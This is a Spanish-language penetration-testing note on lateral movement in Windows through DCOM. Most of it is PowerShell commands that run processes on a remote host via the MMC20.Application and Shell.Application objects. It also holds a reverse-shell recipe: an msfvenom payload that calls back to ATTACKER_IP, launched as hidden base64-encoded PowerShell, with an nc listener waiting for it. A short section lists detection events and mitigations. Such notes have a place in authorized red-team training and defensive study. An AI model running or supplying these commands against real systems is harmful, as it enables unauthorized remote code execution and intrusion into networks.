---
title: DCOM
draft: false
tags:
  - windows
  - active-directory
  - lateral-movement
  - post-exploitation
  - active
---

**Distributed Component Object Model (DCOM)** es un protocolo de Microsoft que permite a los procesos comunicarse entre sí a través de la red. Varios objetos DCOM exponen métodos que pueden usarse para ejecutar comandos de forma remota — sin necesidad de SMB ni WMI en algunos casos.

> [!Requirements]
> - Privilegios de administrador local en la máquina actual.
> - Acceso de red al objetivo (generalmente por RPC, puerto 135 + puertos dinámicos altos).
> - El usuario debe tener permisos para instanciar el objeto DCOM remoto (por defecto, administradores locales pueden hacerlo).

# Técnica: MMC20.Application

El objeto DCOM `MMC20.Application` expone el método `ExecuteShellCommand` que permite ejecutar procesos en el sistema remoto.

```powershell
# 1. Instanciar el objeto DCOM en el sistema objetivo
PS C:\> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","TARGET_IP"))

# 2. Ejecutar un comando remoto
PS C:\> $dcom.Document.ActiveView.ExecuteShellCommand("COMMAND", $null, "PARAMETERS", "7")

# Ejemplo: abrir calculadora (para verificar ejecución)
PS C:\> $dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc", "7")

# Verificar que el proceso corre en el objetivo
PS C:\> tasklist | findstr "calc"
```

> [!Note]
> El parámetro `"7"` en `ExecuteShellCommand` corresponde al `WindowState` = `SW_SHOWMINNOACTIVE` (ventana minimizada). Usar `"1"` para ventana visible.

## Reverse Shell via DCOM

```powershell
# Generar payload base64 con msfvenom o el script de WinRM
# Ejemplo con msfvenom:
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f ps1

# Ejecutar el payload codificado en base64 en el objetivo
PS C:\> $dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "powershell -nop -w hidden -e BASE64_ENCODED_PAYLOAD", "7")

# Escuchar en el atacante
$ nc -lvnp 443
```

# Técnica: ShellWindows / ShellBrowserWindow

Alternativas al objeto MMC20 que también permiten ejecución remota:

```powershell
# ShellWindows
PS C:\> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application","TARGET_IP"))
PS C:\> $dcom.ShellExecute("cmd.exe", "/c whoami > C:\output.txt", "C:\Windows\System32", $null, 0)

# Verificar resultado
PS C:\> type \\TARGET_IP\C$\output.txt
```

# Opsec

> [!Warning]
> **Detección**: DCOM genera eventos en el log de seguridad de Windows. Los analistas pueden detectarlo buscando:
> - **Event ID 4624** (logon) desde IP del atacante
> - **Event ID 10** de Sysmon: ProcessAccess a `mmc.exe` o `explorer.exe` por procesos inusuales
> - Conexiones salientes desde `mmc.exe` hacia puertos de escucha

**Mitigaciones defensivas a tener en cuenta**:
- DCOM puede restringirse mediante `dcomcnfg` (Component Services) → solo ciertos usuarios pueden instanciar objetos remotamente.
- El firewall de Windows bloquea por defecto el acceso DCOM desde redes externas.

# Notas relacionadas

- [[Pass the Hash (PtH)]] — para obtener la sesión de admin necesaria
- [[WMI]] — técnica similar de ejecución remota sin SMB
- [[WinRM]] — alternativa de movimiento lateral más común
- [[Enter-PSSession]] — para movimiento lateral interactivo
